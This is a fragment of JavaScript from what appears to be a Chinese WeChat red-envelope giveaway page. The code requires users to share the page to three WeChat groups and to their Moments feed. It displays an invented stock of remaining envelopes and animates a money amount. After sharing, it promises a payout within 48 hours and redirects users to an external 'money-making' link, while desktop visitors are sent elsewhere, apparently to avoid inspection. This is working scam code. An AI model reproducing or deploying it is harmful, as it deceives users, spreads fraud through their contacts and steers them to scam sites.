...
function share_tip(share_app_times, share_timeline_times) {
    if (share_app_times < 3) {
        wxalert('分享成功,还需分享<span style="font-size: 30px;color: #f5294c">' + (3 - share_app_times) + '</span>个不同的微信群即可', '好')
    } else {
        if (share_timeline_times < 1) {
            wxalert('只差最后一步，请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可', '好')
        } else {
            wxalert('恭喜您，红包会在48小时内存入您的微信钱包，请保留朋友圈24小时哦！<br/><br/>感谢您的参与:)<br/><br/>一个超级<font color="red">赚钱</font>的机会与您分享！', '好，去看看', function() {
                top.location.href = ttUrl;
            })
        }
    }
}
function show_tip() {
    wxalert('活动提示：凡参与活动者，请务必分享到群后，即可领到红包（本次活动全网公开，见者有份）<br><br/>目前剩余红包数量<span style="font-size: 30px;color: #f5294c">3588</span>份', '好')
}
$(function() {
    $('#chai').on('click', function() {
        ...
        setTimeout(function() {
            ...
            var gundong = setInterval(function() {
                ...
                document.getElementById('get_money').innerHTML = money_num
            }, 6)
        }, 1500)
    });
...
isAndroid() || isIos() || (location.href = "http://xw.qq.com/");
